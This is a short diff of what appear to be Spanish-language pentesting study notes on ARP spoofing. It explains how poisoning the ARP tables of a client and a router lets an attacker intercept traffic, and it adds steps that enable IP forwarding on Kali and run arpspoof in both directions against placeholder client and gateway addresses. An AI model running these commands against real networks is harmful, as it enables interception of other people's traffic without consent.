@@ -9,8 +9,12 @@ arp -a
 el ataque consiste en explotar el protocolo arp para que se rescriba la tabla arp en el cliente y ruter para que uno piense que   
 somo el ruter y otro que somos la victima de esta forma podemos interseptar los datos  
 ARPSPOOF:  
+1. Enable Port Forwarding in kali
 ```
 echo 1 > /proc/sys/net/ipv4/ip_forward  
+```
+2. Spoof the target and router
+```
 arpspoof -i [interface wlan0] -t [clientIP] [gatewayIP]  
 arpspoof -i [interface] -t [gatewayIP] [clientIP]  
 ```
